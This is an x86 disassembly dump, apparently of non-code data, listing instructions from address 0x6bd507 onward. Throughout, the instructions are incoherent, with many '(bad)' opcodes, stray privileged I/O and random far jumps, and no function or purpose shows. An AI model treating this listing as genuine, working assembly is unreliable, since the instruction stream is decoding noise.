  6bd507:	or     ecx,DWORD PTR [ecx-0x11652012]
  6bd50d:	jecxz  0x6bd526
  6bd50f:	push   es
  6bd510:	outs   dx,DWORD PTR ds:[esi]
  6bd511:	out    dx,al
  6bd512:	cwde   
  6bd513:	cmp    BYTE PTR [eax-0x46],ch
  6bd516:	pop    ss
  6bd517:	and    BYTE PTR [esp+eiz*8],cl
  6bd51a:	rcr    BYTE PTR [eax],1
  6bd51c:	sbb    ebp,DWORD PTR [ebx-0x2e]
  6bd51f:	sub    esi,eax
  6bd521:	add    ch,BYTE PTR [ecx]
  6bd523:	jb     0x6bd558
  6bd525:	xchg   DWORD PTR [eax],esp
  6bd527:	and    bl,BYTE PTR [ebp+0x37]
  6bd52a:	outs   dx,DWORD PTR ds:[esi]
  6bd52b:	test   al,0xcf
  6bd52d:	dec    edx
  6bd52e:	nop
  6bd52f:	mov    ecx,0xb4043549
  6bd534:	pop    eax
  6bd535:	push   esi
  6bd536:	popa   
  6bd537:	mov    ch,0x28
  6bd53a:	in     eax,0x40
  6bd53c:	not    BYTE PTR [ecx+0x61]
  6bd53f:	xchg   edi,eax
  6bd540:	mov    ?,WORD PTR [esi+eiz*4+0x6d]
  6bd544:	imul   ebx,DWORD PTR [esi-0x2b],0x2fe8e128
  6bd54b:	adc    dh,dl
  6bd54d:	jge    0x6bd539
  6bd54f:	push   esi
  6bd550:	test   DWORD PTR [edi-0x676d7885],esp
  6bd556:	cdq    
  6bd557:	int    0x80
  6bd559:	lock stos BYTE PTR es:[edi],al
  6bd55b:	ds push es
  6bd55d:	and    bh,BYTE PTR [ecx+0x6c37d3c2]
  6bd563:	xchg   esp,eax
  6bd564:	or     al,0x30
  6bd566:	adc    ebp,edi
  6bd568:	cli    
  6bd569:	mov    eax,0xd806a061
  6bd56e:	push   esi
  6bd56f:	pusha  
  6bd570:	dec    ecx
  6bd571:	jp     0x6bd545
  6bd573:	das    
  6bd574:	daa    
  6bd575:	or     ch,dh
  6bd577:	ret    
  6bd578:	inc    edi
  6bd579:	ins    DWORD PTR es:[edi],dx
  6bd57a:	mov    edx,0x7a7d8851
  6bd57f:	cwde   
  6bd580:	adc    edx,DWORD PTR [ebp+eax*2-0x1c]
  6bd584:	jb     0x6bd55d
  6bd586:	jecxz  0x6bd565
  6bd588:	dec    esi
  6bd589:	add    al,bh
  6bd58b:	stos   BYTE PTR es:[edi],al
  6bd58c:	mov    ecx,eax
  6bd58e:	fwait
  6bd58f:	inc    eax
  6bd590:	jbe    0x6bd569
  6bd592:	sub    cl,BYTE PTR [esi+0xdbdc65c]
  6bd598:	push   edi
  6bd599:	cs jge 0x6bd54a
  6bd59c:	imul   BYTE PTR [edx+0x27]
  6bd59f:	stc    
  6bd5a0:	and    esp,DWORD PTR [ebx-0x4a]
  6bd5a3:	mov    al,0x63
  6bd5a5:	push   edx
  6bd5a6:	call   0x3a11:0x7f22801f
  6bd5ad:	(bad)  
  6bd5ae:	hlt    
  6bd5af:	or     ebx,DWORD PTR [edi+0x7e]
  6bd5b2:	cmp    DWORD PTR [eax-0x7598c5fc],esp
  6bd5b8:	push   ebx
  6bd5b9:	fcmovnbe st,st(5)
  6bd5bb:	push   0x8
  6bd5bd:	(bad)  
  6bd5bf:	ret    
  6bd5c0:	rol    DWORD PTR [edi+0x3b1c1c26],1
  6bd5c6:	xor    BYTE PTR [esi+edx*2-0x5ff7379],al
  6bd5cd:	fisubr DWORD PTR [edi]
  6bd5cf:	xor    eax,0x471174f5
  6bd5d4:	lock jb 0x6bd56d
  6bd5d7:	add    dl,al
  6bd5d9:	sti    
  6bd5da:	add    bl,ah
  6bd5dc:	popa   
  6bd5dd:	neg    BYTE PTR [esp+edi*4+0x6684715]
  6bd5e4:	xchg   ebx,eax
  6bd5e5:	or     ebp,ebx
  6bd5e7:	sub    BYTE PTR [ecx],dl
  6bd5e9:	jle    0x6bd5f2
  6bd5eb:	pop    ebx
  6bd5ec:	rol    BYTE PTR [ecx+0x3d],0xe9
  6bd5f0:	jb     0x6bd5bb
  6bd5f2:	sbb    BYTE PTR [edx+0x36],ch
  6bd5f5:	outs   dx,DWORD PTR ds:[esi]
  6bd5f6:	retf   
  6bd5f7:	xor    BYTE PTR [edx],0xf4
  6bd5fa:	xchg   esi,eax
  6bd5fb:	into   
  6bd5fc:	adc    bh,cl
  6bd5fe:	adc    eax,0x430f94b3
  6bd603:	dec    ecx
  6bd604:	hlt    
  6bd605:	mov    ah,0x2e
  6bd607:	stc    
  6bd608:	fstp   st(3)
  6bd60a:	adc    al,BYTE PTR [ebx]
  6bd60c:	cmp    eax,0x54d72bd9
  6bd611:	push   eax
  6bd612:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6bd613:	xlat   BYTE PTR ds:[ebx]
  6bd614:	mov    ebp,0x27ac18ba
  6bd619:	std    
  6bd61a:	popa   
  6bd61b:	xor    dl,BYTE PTR [ecx]
  6bd61d:	sub    eax,esp
  6bd61f:	ss (bad) 
  6bd621:	lea    ecx,[ebx]
  6bd623:	jg     0x6bd5a5
  6bd625:	or     dl,al
  6bd627:	xchg   edi,eax
  6bd628:	mov    ecx,0xac42d189
  6bd62d:	sub    eax,0xbf29d39c
  6bd632:	imul   esi,DWORD PTR [eax+0x36679307],0x45f61584
  6bd63c:	or     ebp,0x2b
  6bd63f:	(bad)  
  6bd641:	rcr    DWORD PTR ds:0x66eeaab1,0x92
  6bd648:	lds    esp,FWORD PTR [edx-0x3e]
  6bd64b:	push   esp
  6bd64c:	jne    0x6bd5fc
  6bd64e:	ins    DWORD PTR es:[edi],dx
  6bd64f:	inc    esp
  6bd650:	jg     0x6bd5d5
  6bd652:	adc    ebp,eax
  6bd654:	mov    al,ds:0x3b206cc6
  6bd659:	sbb    ch,al
  6bd65b:	(bad)  
  6bd65c:	xchg   esi,eax
  6bd65d:	(bad)  
  6bd65f:	lock clc 
  6bd661:	leave  
  6bd662:	push   ebx
  6bd663:	and    cl,dh
  6bd665:	lahf   
  6bd666:	les    ecx,FWORD PTR [esi-0x2e5bd376]
  6bd66c:	add    eax,0x5c30bb41
  6bd671:	xchg   ebp,eax
  6bd672:	xchg   edx,eax
  6bd673:	mov    eax,ds
  6bd675:	dec    edx
  6bd676:	dec    esp
  6bd677:	pop    esp
  6bd678:	imul   esp,eax,0x5f
  6bd67b:	jns    0x6bd615
  6bd67d:	or     dh,BYTE PTR [ebx+edi*1+0x4c]
  6bd681:	sub    eax,0x80d814bb
  6bd686:	lods   eax,DWORD PTR ds:[esi]
  6bd687:	mov    dl,0x34
  6bd689:	iret   
  6bd68a:	cld    
  6bd68b:	add    dh,BYTE PTR [eax-0x57]
  6bd68e:	sub    dh,al
  6bd690:	leave  
  6bd691:	aam    0x1e
  6bd693:	bound  ebx,QWORD PTR [edi]
  6bd695:	ins    BYTE PTR es:[edi],dx
  6bd696:	jno    0x6bd63c
  6bd698:	mov    BYTE PTR [esi+0x71957731],dl
  6bd69e:	js     0x6bd700
  6bd6a0:	fucomip st,st(5)
  6bd6a2:	cmova  esp,ecx
  6bd6a5:	or     al,0xe5
  6bd6a7:	xchg   esi,eax
  6bd6a8:	pop    edx
  6bd6a9:	mov    cl,0xf0
  6bd6ab:	sti    
  6bd6ac:	shl    DWORD PTR [esi+0x77d69b4c],0xbf
  6bd6b3:	sbb    BYTE PTR [esi+0x5c],bh
  6bd6b6:	xchg   ebp,eax
  6bd6b7:	xchg   esp,eax
  6bd6b8:	scas   eax,DWORD PTR es:[edi]
  6bd6b9:	adc    BYTE PTR [ebx+0x1e],bl
  6bd6bc:	sti    
  6bd6bd:	mov    dl,0x3a
  6bd6bf:	push   esi
  6bd6c0:	and    BYTE PTR [edi],dl
  6bd6c2:	pop    ds
  6bd6c3:	mov    DWORD PTR [esi],edi
  6bd6c5:	jns    0x6bd710
  6bd6c7:	and    dl,bh
  6bd6c9:	call   0x2386386b
  6bd6ce:	adc    bl,BYTE PTR [ebp+0x1d]
  6bd6d1:	dec    edx
  6bd6d2:	sar    BYTE PTR ds:0x1396f470,1
  6bd6d8:	sar    dl,1
  6bd6da:	(bad)  
  6bd6db:	aam    0xb3
  6bd6dd:	(bad)  
  6bd6de:	fidivr WORD PTR [edx]
  6bd6e0:	push   ss
  6bd6e1:	sub    al,0xbb
  6bd6e3:	inc    ebx
  6bd6e4:	test   DWORD PTR [eax],0xb64fcc14
  6bd6ea:	adc    esi,DWORD PTR [esi]
  6bd6ec:	clc    
  6bd6ed:	cmp    DWORD PTR ds:0x9b90ae6d,esp
  6bd6f3:	(bad)  
  6bd6f4:	rol    DWORD PTR [ecx-0x4adb9068],1
  6bd6fa:	push   edx
  6bd6fb:	xor    eax,0x28017227
  6bd700:	data16 xor ah,ch
  6bd703:	push   esi
  6bd704:	push   ebx
  6bd705:	js     0x6bd700
  6bd707:	pusha  
  6bd708:	mov    eax,0x46f8c46b
  6bd70d:	(bad)  
  6bd70f:	push   ecx
  6bd710:	lock test BYTE PTR [edi-0x8cecece],cl
  6bd717:	jno    0x6bd775
  6bd719:	stc    
  6bd71a:	rcr    DWORD PTR [esi+0x618ac403],0x32
  6bd721:	ret    
  6bd722:	xchg   esi,eax
  6bd723:	pop    esi
  6bd724:	outs   dx,DWORD PTR ds:[esi]
  6bd725:	pusha  
  6bd726:	mov    al,ds:0x6020ec5
  6bd72b:	pop    edx
  6bd72c:	add    al,0x3d
  6bd72e:	out    dx,eax
  6bd72f:	outs   dx,BYTE PTR ds:[esi]
  6bd730:	push   eax
  6bd731:	mov    al,0x43
  6bd733:	int    0xa8
  6bd735:	jo     0x6bd79e
  6bd737:	fimul  DWORD PTR [ebp-0x36]
  6bd73a:	sar    esp,cl
  6bd73c:	dec    ecx
  6bd73d:	bound  esp,QWORD PTR [edi]
  6bd73f:	xlat   BYTE PTR ds:[ebx]
  6bd740:	mov    bh,0x60
  6bd742:	mov    al,0x83
  6bd744:	ins    BYTE PTR es:[edi],dx
  6bd745:	fwait
  6bd746:	jg     0x6bd71a
  6bd748:	popa   
  6bd749:	or     DWORD PTR [eax],eax
  6bd74b:	stos   BYTE PTR es:[edi],al
  6bd74c:	xor    ch,BYTE PTR [eax]
  6bd74e:	xchg   ecx,eax
  6bd74f:	pusha  
  6bd750:	inc    esi
  6bd751:	push   ds
  6bd752:	jo     0x6bd700
  6bd754:	aam    0xfc
  6bd756:	cmp    eax,0xb02162d2
  6bd75b:	hlt    
  6bd75c:	stos   BYTE PTR es:[edi],al
  6bd75d:	shl    BYTE PTR [esi],cl
  6bd75f:	add    eax,0xffa2b887
  6bd764:	adc    esi,DWORD PTR fs:[eax-0x24]
  6bd768:	cld    
  6bd769:	cwde   
  6bd76a:	ret    
  6bd76b:	mov    al,0xe6
  6bd76d:	jns    0x6bd7b9
  6bd76f:	mov    esi,DWORD PTR [ebx+0x164b04a5]
  6bd775:	sub    DWORD PTR [esi],edi
  6bd777:	xor    BYTE PTR [ebx-0x78],bh
  6bd77a:	dec    ecx
  6bd77b:	shr    BYTE PTR [edi+0x20699f93],0x4a
  6bd782:	fucomp st(7)
  6bd784:	and    DWORD PTR [eax-0x2acdce80],ebx
  6bd78a:	ins    BYTE PTR es:[edi],dx
  6bd78b:	sbb    esi,DWORD PTR [ebp-0x22a64c5e]
  6bd791:	cmp    al,0xc6
  6bd793:	mov    eax,ds:0xbb0b0497
  6bd798:	ret    0x505f
  6bd79b:	pusha  
  6bd79c:	pop    esp
  6bd79d:	loope  0x6bd7c7
  6bd79f:	pop    edi
  6bd7a0:	cmc    
  6bd7a1:	inc    esp
  6bd7a2:	cli    
  6bd7a3:	mov    eax,0xfa06705b
  6bd7a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6bd7a9:	and    edi,DWORD PTR [eax]
  6bd7ab:	adc    BYTE PTR [edx],bl
  6bd7ad:	xchg   ebp,eax
  6bd7ae:	mov    eax,ds:0xf5ab12df
  6bd7b3:	sbb    eax,0xd3321ddf
  6bd7b8:	xchg   DWORD PTR [eax],esp
  6bd7ba:	jl     0x6bd809
  6bd7bc:	loopne 0x6bd7a5
  6bd7be:	dec    edi
  6bd7bf:	shr    DWORD PTR [eax+0x1b5afd3c],1
  6bd7c5:	push   edx
  6bd7c6:	dec    esp
  6bd7c7:	in     eax,dx
  6bd7c8:	out    dx,eax
  6bd7c9:	add    eax,DWORD PTR [ebx-0x45]
  6bd7cc:	ret    0x61fd
  6bd7cf:	or     esp,DWORD PTR [esi]
  6bd7d1:	int3   
  6bd7d2:	jb     0x6bd828
  6bd7d4:	jne    0x6bd798
  6bd7d6:	xchg   BYTE PTR [ecx],al
  6bd7d8:	mov    DWORD PTR [edi],0xa3f7ec03
  6bd7de:	clc    
  6bd7df:	sahf   
  6bd7e0:	mov    ds:0x95cbcf33,al
  6bd7e5:	mov    edx,0xc6b59855
  6bd7ea:	sub    al,0x7e
  6bd7ec:	mov    ecx,0x45eead04
  6bd7f1:	adc    dl,BYTE PTR [esi]
  6bd7f3:	into   
  6bd7f4:	fist   DWORD PTR [eax-0x26375dd5]
  6bd7fa:	ret    0x759c
  6bd7fd:	xchg   BYTE PTR [edi],cl
  6bd7ff:	cmp    dl,ah
  6bd801:	popf   
  6bd802:	pop    eax
  6bd803:	push   cs
  6bd804:	jecxz  0x6bd80f
  6bd806:	in     al,0x18
  6bd808:	(bad)  
  6bd809:	test   al,0x2c
  6bd80b:	jmp    edx
  6bd80d:	sbb    BYTE PTR [ecx+0x9],bl
  6bd810:	lock sub eax,0x6de71891
  6bd816:	jecxz  0x6bd7d3
  6bd818:	mov    dh,0x8a
  6bd81b:	sbb    ah,dh
  6bd81d:	sbb    BYTE PTR [edx-0x3e],dl
  6bd820:	inc    eax
  6bd821:	(bad)  
  6bd822:	jmp    0x6bd7ac
  6bd824:	jg     0x6bd821
  6bd826:	xor    al,0x1c
  6bd828:	js     0x6bd7f4
  6bd82a:	lds    ebp,FWORD PTR [edi]
  6bd82c:	loopne 0x6bd80a
  6bd82e:	fwait
  6bd82f:	xor    eax,0x69e361b
  6bd834:	mov    edx,0x822b2bc5
  6bd839:	cld    
  6bd83a:	lods   eax,DWORD PTR ds:[esi]
  6bd83b:	add    DWORD PTR ds:0x90e99815,esi
  6bd841:	hlt    
  6bd842:	xchg   ebp,eax
  6bd843:	call   ebp
  6bd845:	fsubr  DWORD PTR [eax]
  6bd847:	icebp  
  6bd848:	xor    BYTE PTR [edx+0x2],al
  6bd84b:	ror    eax,cl
  6bd84d:	(bad)  
  6bd84f:	sbb    ebx,0xc4392857
  6bd855:	xlat   BYTE PTR ds:[ebx]
  6bd856:	dec    eax
  6bd857:	clc    
  6bd858:	in     al,0x8f
  6bd85a:	ret    
  6bd85b:	add    al,0x9a
  6bd85d:	aaa    
  6bd85e:	cmp    DWORD PTR [ebp-0xd3b9e5a],edx
  6bd864:	lods   al,BYTE PTR ds:[esi]
  6bd865:	out    0x4d,eax
  6bd867:	mov    fs,WORD PTR [esi+eax*2+0x65]
  6bd86b:	push   ss
  6bd86c:	mov    ah,0x8e
  6bd86e:	arpl   ax,sp
  6bd870:	mov    eax,ds:0xde2399a0
  6bd875:	ss dec esi
  6bd877:	addr16 mov ecx,0x8bf28f2
  6bd87d:	inc    eax
  6bd87e:	inc    ebp
  6bd87f:	mov    edi,0x462bb520
  6bd884:	pushf  
  6bd885:	push   0x16aa3c1f
  6bd88a:	std    
  6bd88b:	loop   0x6bd8f1
  6bd88d:	jno    0x6bd81e
  6bd88f:	jmp    0x6bd896
  6bd891:	mov    ds:0xb6790c13,al
  6bd896:	adc    ecx,DWORD PTR [edx-0x30]
  6bd899:	push   eax
  6bd89a:	mov    ebp,DWORD PTR [esi]
  6bd89c:	idiv   bh
  6bd89e:	imul   edi,DWORD PTR [eax-0x6b7ecb6a],0x22
  6bd8a5:	dec    ecx
  6bd8a6:	mov    esp,eax
  6bd8a8:	jne    0x6bd8c0
  6bd8aa:	or     BYTE PTR [esi-0x6d248cd8],bl
  6bd8b0:	sub    eax,0xe2d86dcb
  6bd8b5:	ret    0x51d0
  6bd8b8:	pop    ebx
  6bd8b9:	jnp    0x6bd881
  6bd8bb:	call   0x7f37:0x5e58e67c
  6bd8c2:	sbb    ch,cl
  6bd8c4:	dec    eax
  6bd8c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6bd8c6:	gs (bad) 
  6bd8c8:	int3   
  6bd8c9:	mov    DWORD PTR [ebp-0x5],ebp
  6bd8cc:	jb     0x6bd8e0
  6bd8ce:	adc    BYTE PTR [ebp+ecx*8-0x8a1b629],ch
  6bd8d5:	les    esi,FWORD PTR ds:[eax]
  6bd8d8:	das    
  6bd8d9:	pop    DWORD PTR [ecx]
  6bd8db:	pushf  
  6bd8dc:	pop    esp
  6bd8dd:	aas    
  6bd8de:	push   ss
  6bd8df:	js     0x6bd8f8
  6bd8e1:	ror    BYTE PTR [esp+ebp*8-0x4f],cl
  6bd8e5:	or     edx,DWORD PTR [esi]
  6bd8e7:	fs mov bh,0xa1
  6bd8ea:	frstor [ebp+eiz*8+0x64]
  6bd8ee:	fdiv   QWORD PTR [edx+0x708eb8ed]
  6bd8f4:	ds daa 
  6bd8f6:	mov    dh,0xfc
  6bd8f8:	pop    edx
  6bd8f9:	dec    ebx
  6bd8fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6bd8fb:	repnz mov esp,0xadb9723c
  6bd901:	rcr    BYTE PTR [eax+0x0],1
  6bd904:	jge    0x6bd8be
  6bd906:	dec    edx
  6bd907:	or     BYTE PTR [esi],0x32
  6bd90a:	push   0x1c08296
  6bd90f:	sub    ebx,DWORD PTR [esi+0x526679ed]
  6bd915:	pop    es
  6bd916:	xor    dl,al
  6bd918:	daa    
  6bd919:	xor    ebp,DWORD PTR [ecx-0x54dd2138]
  6bd91f:	aaa    
  6bd920:	into   
  6bd921:	inc    edi
  6bd922:	inc    edx
  6bd923:	push   ds
  6bd924:	push   edx
  6bd925:	or     eax,0x7d71b4d6
  6bd92a:	mov    ch,0x3a
  6bd92c:	jae    0x6bd8f2
  6bd92e:	push   ebx
  6bd92f:	push   0x97db1475
  6bd934:	(bad)  
  6bd935:	xlat   BYTE PTR ds:[ebx]
  6bd936:	and    esp,DWORD PTR [edx]
  6bd938:	repz inc esp
  6bd93a:	loope  0x6bd952
  6bd93c:	rcl    DWORD PTR [ebx],cl
  6bd93e:	nop
  6bd93f:	or     eax,0x8391822d
  6bd944:	sub    eax,0x6fbafeae
  6bd949:	push   ebp
  6bd94a:	mov    WORD PTR [ebx-0xa],ds
  6bd94d:	fld    DWORD PTR [edi-0x3]
  6bd950:	test   eax,0xa757560d
  6bd955:	cmp    al,0xce
  6bd957:	out    0xe,al
  6bd959:	xchg   ebx,eax
  6bd95a:	mov    eax,0xfa5ce51b
  6bd95f:	mov    bl,0xc9
  6bd961:	(bad)  
  6bd962:	adc    bl,BYTE PTR [ebx-0x10]
  6bd965:	inc    edx
  6bd966:	mov    bl,0xeb
  6bd968:	add    BYTE PTR [edi],ch
  6bd96a:	ror    DWORD PTR [esi-0x44],cl
  6bd96d:	call   0xffa18a
  6bd972:	mov    al,0xac
  6bd974:	das    
  6bd975:	bound  ebp,QWORD PTR [edi+0x66f052c5]
  6bd97b:	adc    ecx,0xffffff9d
  6bd97e:	or     eax,0xaf78f5be
  6bd983:	dec    eax
  6bd984:	or     eax,0x2cebf2fd
  6bd989:	push   0xad852b5d
  6bd98e:	jns    0x6bd96b
  6bd990:	jo     0x6bd95e
  6bd992:	ss jnp 0x6bd9a5
  6bd995:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6bd996:	mov    ds:0x2913438a,al
  6bd99b:	je     0x6bd963
  6bd99d:	and    al,0xfc
  6bd99f:	fwait
  6bd9a0:	nop
  6bd9a1:	mov    ebp,0x1e6575e1
  6bd9a6:	sbb    edi,eax
  6bd9a8:	(bad)  
  6bd9a9:	jmp    FWORD PTR [ebx+eiz*8+0x4380f93c]
  6bd9b0:	jle    0x6bd96a
  6bd9b2:	jne    0x6bd955
  6bd9b4:	dec    esi
  6bd9b5:	inc    edx
  6bd9b6:	gs repz dec edx
  6bd9b9:	and    ebx,0x6e
  6bd9bc:	ins    DWORD PTR es:[edi],dx
  6bd9bd:	inc    edx
  6bd9be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6bd9bf:	ret    
  6bd9c0:	shl    ch,1
  6bd9c2:	div    BYTE PTR [eax]
  6bd9c4:	push   ss
  6bd9c5:	lock mov WORD PTR [ebp+0x44],?
  6bd9c9:	stos   BYTE PTR es:[edi],al
  6bd9ca:	test   BYTE PTR [edx],ah
  6bd9cc:	mov    ds:0x14899a55,eax
  6bd9d1:	or     ah,BYTE PTR [ecx]
  6bd9d3:	jl     0x6bd9cc
  6bd9d5:	jb     0x6bd9ff
  6bd9d7:	or     eax,0x1d85cf2a
  6bd9dc:	pop    edi
  6bd9dd:	mov    bl,0x62
  6bd9df:	imul   eax,DWORD PTR [esi-0x4c],0x2c
  6bd9e3:	xchg   ecx,eax
  6bd9e4:	inc    ebx
  6bd9e5:	sti    
  6bd9e6:	and    eax,0xad02c5fc
  6bd9eb:	and    eax,DWORD PTR [ebp-0x52]
  6bd9ee:	inc    ebx
  6bd9ef:	(bad)  
  6bd9f0:	out    dx,al
  6bd9f1:	xchg   esi,ecx
  6bd9f3:	aaa    
  6bd9f4:	(bad)  
  6bd9f5:	jmp    0x43ebccf3
  6bd9fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6bd9fb:	xor    al,0x8e
  6bd9fd:	enter  0x377b,0xba
  6bda01:	(bad)  
  6bda02:	repz sbb ebp,edx
  6bda05:	in     eax,dx
  6bda06:	mov    WORD PTR [edx+0x5d],gs
  6bda09:	jae    0x6bd9b8
  6bda0b:	out    0x28,eax
  6bda0d:	xor    cl,BYTE PTR [ebx-0x2b]
  6bda10:	push   ecx
  6bda11:	stos   BYTE PTR es:[edi],al
  6bda12:	mov    eax,0xf4bffdbb
  6bda17:	jle    0x6bda64
  6bda19:	iret   
  6bda1a:	and    ebx,DWORD PTR [ebx]
  6bda1c:	cmp    DWORD PTR [eax+0x6c],0xb713ef6a
  6bda23:	adc    al,0x8e
  6bda25:	cmp    BYTE PTR [eax+ebp*1],al
  6bda28:	cdq    
  6bda29:	mov    BYTE PTR [esi+eax*1-0x37bebda5],dh
  6bda30:	bound  ebx,QWORD PTR [eax-0x1d]
  6bda33:	js     0x6bda8e
  6bda35:	out    dx,eax
  6bda36:	dec    esi
  6bda37:	push   edi
  6bda38:	(bad)  
  6bda39:	push   edx
  6bda3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6bda3b:	or     DWORD PTR [edx-0x3e9cd014],ebx
  6bda41:	sar    ah,1
  6bda43:	lock mov ebx,DWORD PTR [eax+ebp*8]
  6bda47:	je     0x6bd9cc
  6bda49:	nop
  6bda4a:	pop    es
  6bda4b:	(bad)  
  6bda4c:	push   0x92a9a6c
  6bda51:	push   0xffffff95
  6bda53:	mov    ecx,0xa9bcb540
  6bda58:	test   al,0x9e
  6bda5a:	pop    eax
  6bda5b:	push   eax
  6bda5c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6bda5d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6bda5e:	rcl    DWORD PTR [ebx-0x19],0x3
  6bda62:	(bad)  [ebx+0x35]
  6bda65:	push   esp
  6bda66:	dec    BYTE PTR [ebp+0x17e761e9]
  6bda6c:	maskmovq mm5,mm3
  6bda6f:	jns    0x6bda47
  6bda71:	(bad)  
  6bda72:	push   ss
  6bda73:	add    ebp,DWORD PTR [edx]
  6bda75:	pop    edi
  6bda76:	outs   dx,DWORD PTR ds:[esi]
  6bda77:	cmp    DWORD PTR [edx+0x6c],edi
  6bda7a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6bda7b:	xchg   esi,eax
  6bda7c:	sar    BYTE PTR [eax-0x14382215],1
  6bda82:	(bad)  
  6bda83:	and    ebp,DWORD PTR [ecx]
  6bda85:	iret   
  6bda86:	mov    gs,WORD PTR [edi]
  6bda88:	xchg   ecx,eax
  6bda89:	add    ebx,DWORD PTR [esi]
  6bda8b:	imul   eax,DWORD PTR [edi],0xb9ec8545
  6bda91:	jl     0x6bda38
  6bda93:	sbb    eax,0x9ecece9a
  6bda98:	out    0xa0,eax
  6bda9a:	mov    bh,0xb2
  6bda9c:	jg     0x6bda40
  6bda9e:	je     0x6bdaae
  6bdaa0:	ja     0x6bda23
  6bdaa2:	shr    BYTE PTR [ecx],cl
  6bdaa4:	push   0xfa9493d8
  6bdaa9:	mov    dl,0xa8
  6bdaab:	and    DWORD PTR [ebx+0x76bc2121],edx
  6bdab1:	jno    0x6bdad2
  6bdab3:	fs mov esp,0x15b3a81f
  6bdab9:	std    
  6bdaba:	xchg   edi,eax
  6bdabb:	jp     0x6bdaa5
  6bdabd:	mov    ecx,0x3bf9b33c
  6bdac2:	sub    al,BYTE PTR [edx+0x4c]
  6bdac5:	in     eax,dx
  6bdac6:	stc    
  6bdac7:	mov    ds:0x71d73e73,eax
  6bdacc:	in     eax,dx
  6bdacd:	loop   0x6bdb13
  6bdacf:	adc    ebx,DWORD PTR [edi]
  6bdad1:	adc    DWORD PTR [eax],ebp
  6bdad3:	jno    0x6bdaa7
  6bdad5:	(bad)  
  6bdad6:	loopne 0x6bdacf
  6bdad8:	shl    ecx,cl
  6bdada:	scas   al,BYTE PTR es:[edi]
  6bdadb:	xor    eax,0x83472208
  6bdae0:	or     DWORD PTR [edi],esp
  6bdae2:	ss mov esp,0xc35faffe
  6bdae8:	jle    0x6bdacd
  6bdaea:	mov    ah,0x53
  6bdaec:	stos   DWORD PTR es:[edi],eax
  6bdaed:	sahf   
  6bdaee:	inc    edi
  6bdaef:	cdq    
  6bdaf0:	imul   esp,DWORD PTR [esi+0x18d9307],0xffffffa0
  6bdaf7:	xchg   esp,eax
  6bdaf8:	mov    ch,0x42
  6bdafa:	sbb    eax,esp
  6bdafc:	pop    es
  6bdafd:	mov    eax,ds:0x3912e96f
  6bdb02:	rol    DWORD PTR [ebx+0x79],cl
  6bdb05:	mov    edx,0xc39e7070
  6bdb0a:	aaa    
  6bdb0b:	pop    esi
  6bdb0c:	jmp    0xdf83:0x69afa7ae
  6bdb13:	adc    al,0x55
  6bdb15:	xor    ecx,edx
  6bdb17:	stos   BYTE PTR es:[edi],al
  6bdb18:	and    ah,dl
  6bdb1a:	mov    ds:0xb051daad,eax
  6bdb1f:	ds xchg ebp,eax
  6bdb21:	inc    ebp
  6bdb22:	adc    BYTE PTR [eax-0x63],dh
  6bdb25:	enter  0x856f,0xd4
  6bdb29:	mov    ebx,0x79bb6036
  6bdb2e:	and    al,0x86
  6bdb30:	dec    eax
  6bdb31:	sbb    al,0x8f
  6bdb33:	(bad)  
  6bdb34:	mov    eax,ds:0x4f3a1088
  6bdb39:	xchg   esp,eax
  6bdb3a:	sbb    edi,esp
  6bdb3c:	out    0x20,eax
  6bdb3e:	(bad)  
  6bdb3f:	or     ah,cl
  6bdb41:	lods   eax,DWORD PTR ds:[esi]
  6bdb42:	pop    edi
  6bdb43:	out    dx,eax
  6bdb44:	sbb    eax,0x9b602301
  6bdb49:	mov    cl,0xb7
  6bdb4b:	lods   al,BYTE PTR ds:[esi]
  6bdb4c:	jl     0x6bdaec
  6bdb4e:	pop    esp
  6bdb4f:	adc    bh,BYTE PTR [esi+esi*1+0x21]
  6bdb53:	adc    cl,BYTE PTR [eax]
  6bdb55:	aad    0xd7
  6bdb57:	sbb    al,0x7c
  6bdb59:	fdivr  st,st(2)
  6bdb5b:	les    esp,FWORD PTR [ebx+0x23]
  6bdb5e:	fwait
  6bdb5f:	ins    BYTE PTR es:[edi],dx
  6bdb60:	(bad)  
  6bdb61:	xchg   BYTE PTR [edx-0x56],cl
  6bdb64:	or     DWORD PTR [ebp+0x6f],edi
  6bdb67:	sub    eax,DWORD PTR [edx+0x29]
  6bdb6a:	in     al,dx
  6bdb6b:	xchg   bl,bl
  6bdb6d:	jns    0x6bdb11
  6bdb6f:	inc    esp
  6bdb70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6bdb71:	aam    0xdd
  6bdb73:	daa    
  6bdb74:	xchg   eax,edi
  6bdb76:	mov    edx,gs
  6bdb78:	call   0xf949:0x6a7854b
  6bdb7f:	call   ecx
  6bdb81:	rcr    BYTE PTR [edx-0x5f4507a3],0xcb
  6bdb88:	ror    BYTE PTR [ebx+0x9],1
  6bdb8b:	es in  eax,dx
  6bdb8d:	inc    ebp
  6bdb8e:	fnstenv [ebp+edx*2+0x435cb24f]
  6bdb95:	sub    DWORD PTR [esi],esi
  6bdb97:	add    eax,0x470748b9
  6bdb9c:	dec    edi
  6bdb9d:	inc    edx
  6bdb9e:	scas   al,BYTE PTR es:[edi]
  6bdb9f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6bdba0:	adc    DWORD PTR [esi+0x5b25b3f6],0xfca198d4
  6bdbaa:	pmovmskb ecx,mm6
  6bdbad:	test   DWORD PTR [eax+0x7f],ecx
  6bdbb0:	pop    ds
  6bdbb1:	stos   DWORD PTR es:[edi],eax
  6bdbb2:	rcl    BYTE PTR [eax+eiz*2+0x30dc9d54],cl
  6bdbb9:	test   ecx,eax
  6bdbbb:	in     al,dx
  6bdbbc:	dec    ebx
  6bdbbd:	jns    0x6bdbdd
  6bdbbf:	mov    ebx,0x74817287
  6bdbc4:	or     BYTE PTR [ebx],bl
  6bdbc6:	push   0xffffffdd
  6bdbc8:	inc    ebx
  6bdbc9:	sub    esi,ecx
  6bdbcb:	mov    BYTE PTR [esi],dh
